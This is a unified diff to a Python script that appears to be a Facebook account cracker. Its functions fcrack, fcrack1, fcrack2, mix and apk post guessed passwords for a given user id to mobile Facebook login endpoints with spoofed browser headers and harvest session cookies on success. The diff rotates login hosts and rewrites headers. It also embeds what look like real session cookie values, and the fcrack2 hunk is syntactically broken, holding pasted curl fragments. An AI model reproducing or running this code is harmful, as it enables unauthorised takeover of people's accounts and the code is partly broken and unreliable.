@@ -662,17 +662,19 @@ def apk(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'free.facebook.com',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     # Requests sorts cookies= alphabetically
-    # 'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo',
-    'sec-ch-ua: "(Not(A:Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'sec-ch-ua-platform: "Windows"',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: none',
-    'sec-fetch-user: ?1',
-    'upgrade-insecure-requests: 1',
+    # 'cookie': 'datr=tOkiZNWxg4iFXk5vay1l9zod; sb=tOkiZGd_Cjyhf0J3U3WOykHF; fr=0nV7Hu0FobD3Mnt95..BkIwev.xy.AAA.0.0.BkIwfS.AWUp262_CR0',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
     'user-agent': pro}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -718,20 +720,22 @@ def mix(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            header_freefb = {'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     # Requests sorts cookies= alphabetically
-    # 'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo',
-    'sec-ch-ua: "(Not(A:Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'sec-ch-ua-platform: "Windows"',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: none',
-    'sec-fetch-user: ?1',
-    'upgrade-insecure-requests: 1',
+    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -774,20 +778,22 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            header_freefb = {'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     # Requests sorts cookies= alphabetically
-    # 'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo',
-    'sec-ch-ua: "(Not(A:Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'sec-ch-ua-platform: "Windows"',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: none',
-    'sec-fetch-user: ?1',
-    'upgrade-insecure-requests: 1',
+    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsIu.AWXnr0C8kDY',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -830,20 +836,22 @@ def fcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            header_freefb = {'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     # Requests sorts cookies= alphabetically
-    # 'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo',
-    'sec-ch-ua: "(Not(A:Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'sec-ch-ua-platform: "Windows"',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: none',
-    'sec-fetch-user: ?1',
-    'upgrade-insecure-requests: 1',
+    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -888,19 +896,22 @@ def fcrack2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    # Requests sorts cookies= alphabetically
-    # 'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo',
-    'sec-ch-ua: "(Not(A:Brand";v="99"',
-    'sec-ch-ua-mobile: ?0',
-    'sec-ch-ua-platform: "Windows"',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: none',
-    'sec-fetch-user: ?1',
-    'upgrade-insecure-requests: 1',
-    'user-agent': pro}
+            header_freefb = {'https://free.facebook.com/' 
+  'authority: free.facebook.com' 
+  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' 
+  'accept-language: en-GB,en-US;q=0.9,en;q=0.8' 
+  'cache-control: max-age=0' 
+  'cookie: dpr=1.3562500476837158; wd=531x677; datr=UwxVZG_RVPpJxBQ5lNyT18-D; sb=UwxVZG5oMpyY8UoY80loDiS3; fr=0Z5ZTdqQmyLXt3zi4.AWUF8-EXqIpqusYuhTvF68HEkEw.BkUdZS.xN.AAA.0.0.BkVfIs.AWXzkhICUwo' 
+  -H 'sec-ch-ua: "(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"' 
+   'sec-ch-ua-mobile: ?0' 
+   'sec-ch-ua-platform: "Windows"' 
+   'sec-fetch-dest: document' 
+  'sec-fetch-mode: navigate' 
+  'sec-fetch-site: none' 
+  'sec-fetch-user: ?1' 
+  'upgrade-insecure-requests: 1' 
+  'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5644.222 Safari/537.36' 
+  'x-chrome-offline: persist=0 reason=reload'
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
